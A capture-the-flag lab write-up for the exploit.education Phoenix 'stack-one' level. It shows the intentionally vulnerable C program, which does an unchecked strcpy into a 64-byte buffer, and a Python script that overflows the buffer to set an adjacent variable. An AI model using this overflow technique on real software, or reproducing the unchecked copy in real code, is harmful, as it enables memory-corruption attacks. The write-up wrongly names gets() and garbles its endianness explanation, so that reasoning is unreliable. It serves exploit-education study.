# Stack-One

## Source Code
```c
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

## Approach
* Structure occupies space linearly in memory, so if we overflow the buffer we can change the ``changeme`` variable.
* ``gets()`` is always vulnerable and cause overflow through variable memory.
* There are 64 bytes of buffer and we need to just and 0x496c5962 to modify value of ``changeme`` variable as they are expecting.
* We need to also know the endianness i.e stack grows backward and variables are allocated one above another one by one. So, we need to fiip the bytes given i.e 62596c49 and 64 random characters before it.  
* Also we need to give that as argument. 

## Exploit
```python
import os

arg = 'a'*64 + chr(0x62) + chr(0x59)+ chr(0x6c) + chr(0x49)

os.system('/opt/phoenix/amd64/stack-one '+arg)
```
